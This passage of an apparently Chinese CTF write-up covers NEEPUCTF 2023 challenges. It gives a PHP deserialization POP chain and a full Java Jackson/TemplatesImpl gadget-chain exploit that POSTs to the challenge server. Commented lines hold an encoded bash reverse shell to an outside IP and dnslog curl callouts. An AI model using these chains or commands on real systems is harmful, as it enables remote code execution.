class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">two</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">three</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;neepu-&gt;<span class="title function_ invoke__">neepuctf</span>())&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fin-&gt;<span class="title function_ invoke__">NEEPUCTF1</span>(<span class="variable">$this</span>-&gt;rce,<span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">five</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finish</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">four</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;rce=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;rce1=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">one</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;finish-&gt;finish=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;neepu=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">one</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;key=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;finish-&gt;finish=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;now[<span class="string">&#x27;NEEPUCTF1&#x27;</span>]=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fin=<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<p>我的poc如上，直接传参即可得到flag了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684674930952-b3bcc65b-dd84-4801-b755-785c1155a733.png#averageHue=%23b2b2b2&clientId=u1e86b3c8-0e66-4&from=paste&height=864&id=u968dd3f8&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120629&status=done&style=none&taskId=uc5c81f84-ce10-4927-9ec3-8989f76f39f&title=&width=1536" alt="image.png"></p>
<h2 id="No-Map"><a href="#No-Map" class="headerlink" title="No Map"></a>No Map</h2><p>考点：jackson反序列化<br>这道题的话假如出题人不去掉rasp的话我是出不来了，谢谢出题大大的福利呜呜呜呜我太菜了，一定学rasp<br>源码给了如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.demo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.util.MyObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">status</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome to NEEPUCTF 2023 :D&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/nomap&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">noMap</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">MyObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(request.getInputStream());</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> ois.readUTF();</span><br><span class="line">            <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> ois.readInt();</span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;NEEPU&quot;</span>) &amp;&amp; year == <span class="number">1949</span>) &#123;</span><br><span class="line">                ois.readObject();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No map to deserialize XD&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>裸反序列化，然后看看依赖<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684675098653-f0907db3-5019-42be-88b3-13fb8820bdfd.png#averageHue=%232c2e2d&clientId=u1e86b3c8-0e66-4&from=paste&height=614&id=u61b9fbd6&originHeight=768&originWidth=579&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=732375&status=done&style=none&taskId=uc32085b5-3899-4dbc-9c11-ce3c05f6cbb&title=&width=463.2" alt="image.png"><br>没啥特别的东西，所以感觉出题人对java这块很熟悉了，因为这就是最近的aliyun出现的jackson反序列化<br>和fastjson一样，jackson的pojonode类的toString也可以触发任意的toString<br>但是这里有个问题，就是出题人把readObject-&gt;toString这里ban掉了，也就断开了线索，经过查找，发现有个类符合要求<code>AbstractAction</code>，这是一个抽象类，具体去找实现类皆可，看看他的readObject<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684675307414-78c117ba-15f4-432c-b970-4ef9de4d7c0e.png#averageHue=%23272824&clientId=u1e86b3c8-0e66-4&from=paste&height=452&id=u107db0d3&originHeight=565&originWidth=993&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=786860&status=done&style=none&taskId=u61bac631-a518-4554-bb02-2dfef316dae&title=&width=794.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684675312964-8b770cda-1b68-40ea-b179-85ae43fcc9b7.png#averageHue=%231f201e&clientId=u1e86b3c8-0e66-4&from=paste&height=129&id=ud534b89f&originHeight=161&originWidth=714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=155154&status=done&style=none&taskId=ufecafe3c-824a-4b87-bf22-bfec44efeae&title=&width=571.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684675319579-9a9fde6a-315a-4b40-9496-986730d0dad5.png#averageHue=%23292b26&clientId=u1e86b3c8-0e66-4&from=paste&height=273&id=u69503f0e&originHeight=341&originWidth=1121&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=538140&status=done&style=none&taskId=u0224a5de-9606-4933-acac-a373cfbfbc3&title=&width=896.8" alt="image.png"><br>会调用equals，这里思路就清晰了，可以用它触发Xstring的equals，那么就可以构造payload，有个小细节就是要重写他的writeArrayTable，否则无法触发。我重写方法如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684675368508-26455771-0df7-46e0-bd78-3f05832d0256.png#averageHue=%232c2c27&clientId=u1e86b3c8-0e66-4&from=paste&height=400&id=ueca1b773&originHeight=500&originWidth=1123&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=799023&status=done&style=none&taskId=u2a0f7968-c9a7-4961-af0f-b16410f7c9f&title=&width=898.4" alt="image.png"><br>之后payload如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassMap;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.SwingPropertyChangeSupport;</span><br><span class="line"><span class="keyword">import</span> javax.swing.text.StyledEditorKit;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\InjectToController.class&quot;));</span></span><br><span class="line">        <span class="comment">//        String s1 = Base64.getEncoder().encodeToString(bytes);</span></span><br><span class="line">        <span class="comment">//        System.out.println(s1);</span></span><br><span class="line">        <span class="comment">//        String x = &quot;var str=&#x27;&quot;+s1+&quot;&#x27;;var Thread = Java.type(&#x27;java.lang.Thread&#x27;);var tt=Thread.currentThread().getContextClassLoader();var b64 = Java.type(&#x27;sun.misc.BASE64Decoder&#x27;);var b=new b64().decodeBuffer(str);var byteArray = Java.type(&#x27;byte[]&#x27;);var int = Java.type(&#x27;int&#x27;);var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&#x27;defineClass&#x27;,byteArray.class,int.class,int.class);defineClassMethod.setAccessible(true);var cc = defineClassMethod.invoke(tt,b,0,b.length);cc.newInstance();&quot;;</span></span><br><span class="line">        <span class="comment">//        //String x = &quot;java.lang.Runtime.getRuntime().exec(\\\&quot;calc\\\&quot;)&quot;;</span></span><br><span class="line">        <span class="comment">//        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);</span></span><br><span class="line">        <span class="comment">//        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;pupi1=eval&quot;));</span></span><br><span class="line">        <span class="comment">//        resourceRef.add(new StringRefAddr(&quot;pupi1&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;js\&quot;).eval(\&quot;&quot;+ x +&quot;\&quot;)&quot;));</span></span><br><span class="line">        <span class="comment">//        Class&lt;?&gt; ccCl = Class.forName(&quot;javax.naming.spi.ContinuationDirContext&quot;); //$NON-NLS-1$</span></span><br><span class="line">        <span class="comment">//ClassPool pool = ClassPool.getDefault();</span></span><br><span class="line">        <span class="comment">//CtClass ctClass = pool.makeClass(&quot;a&quot;);</span></span><br><span class="line">        <span class="comment">//CtClass superClass = pool.get(AbstractTranslet.class.getName());</span></span><br><span class="line">        <span class="comment">//ctClass.setSuperclass(superClass);</span></span><br><span class="line">        <span class="comment">//CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span></span><br><span class="line">        <span class="comment">//constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span></span><br><span class="line">        <span class="comment">//constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,Y3VybCBodHRwOi8vMG1xMHdxLmRuc2xvZy5jbg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span></span><br><span class="line">        <span class="comment">//constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;curl http://0mq0wq.dnslog.cn\&quot;);&quot;);</span></span><br><span class="line">        <span class="comment">//ctClass.addConstructor(constructor);</span></span><br><span class="line">        <span class="comment">//byte[] bytes = ctClass.toBytecode();</span></span><br><span class="line">        <span class="comment">//TemplatesImpl templatesImpl = new TemplatesImpl();</span></span><br><span class="line">        <span class="comment">//setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span></span><br><span class="line">        <span class="comment">//setFieldValue(templatesImpl, &quot;_name&quot;, &quot;boogipop&quot;);</span></span><br><span class="line">        <span class="comment">//setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);</span></span><br><span class="line">        <span class="comment">//byte[] code= Files.readAllBytes(Paths.get(&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\evil.class&quot;));</span></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\InjectToController.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;boogipop&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val2.set(exp2,jsonNodes2);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(exp2,privateKey,signingEngine);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="type">SwingPropertyChangeSupport</span> <span class="variable">swingPropertyChangeSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingPropertyChangeSupport</span>(<span class="string">&quot;11&quot;</span>);</span><br><span class="line">        StyledEditorKit.<span class="type">AlignmentAction</span> <span class="variable">alignmentAction</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StyledEditorKit</span>.AlignmentAction(<span class="string">&quot;111&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.swing.AbstractAction&quot;</span>).getDeclaredField(<span class="string">&quot;changeSupport&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(alignmentAction,swingPropertyChangeSupport);</span><br><span class="line">        alignmentAction.putValue(<span class="string">&quot;11&quot;</span>,xString);</span><br><span class="line">        alignmentAction.putValue(<span class="string">&quot;12&quot;</span>,jsonNodes);</span><br><span class="line">        <span class="comment">//deserial(serial(alignmentAction));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;NEEPU&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">1949</span>);</span><br><span class="line">        objectOutputStream.writeObject(alignmentAction);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        <span class="comment">//System.out.println(serial(exp));</span></span><br><span class="line">        <span class="comment">//deserial(serial(map));</span></span><br><span class="line">        <span class="comment">//doPOST(exp.toString().getBytes());</span></span><br><span class="line">        <span class="type">byte</span>[] byt=<span class="keyword">new</span> <span class="title class_">byte</span>[fileInputStream.available()];</span><br><span class="line">        fileInputStream.read(byt);</span><br><span class="line">        doPOST(byt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HttpHeaders</span> <span class="variable">requestHeaders</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">        requestHeaders.set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://neepusec.fun:27010/nomap&quot;</span>);</span><br><span class="line">        <span class="comment">//URI url = new URI(&quot;http://localhost:8090/nomap&quot;);</span></span><br><span class="line">        <span 